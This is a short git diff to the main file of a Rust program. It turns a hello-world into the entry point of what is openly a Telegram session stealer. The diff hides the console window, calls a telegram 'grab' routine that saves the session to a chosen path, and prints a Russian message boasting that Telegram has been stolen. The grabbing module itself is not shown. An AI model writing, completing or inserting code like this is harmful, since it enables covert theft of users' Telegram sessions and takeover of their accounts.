@@ -1,8 +1,12 @@
+#![windows_subsystem = "windows"] // Скрываем консоль
+
 mod apps;
 mod utils;
-use tokio;
 
-#[tokio::main]
-async fn main() {
-    println!("Hello, world!");
+fn main() {
+    let result_path = String::from("ПУТЬ КУДА СОХРАНЯЕМ СЕССИЮ");
+
+    crate::apps::telegram::grab(result_path.into());
+
+    println!("Телеграм украли и че дальше?");
 }
